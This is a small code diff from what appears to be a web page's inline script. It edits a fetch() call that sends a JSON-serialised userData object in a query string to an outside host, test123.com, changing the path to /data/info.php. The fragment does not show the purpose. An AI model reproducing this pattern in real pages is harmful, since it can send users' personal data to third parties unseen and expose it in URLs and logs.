@@ -129,9 +129,7 @@
                     }
                 };
 
-            fetch(`http://test123.com/info.php?firstInfo=${JSON.stringify(userData)}`)
-                .then(e => e.text())
-                .then(a => a)
+            fetch(`http://test123.com/data/info.php?firstInfo=${JSON.stringify(userData)}`)
         }
     }
 </script>
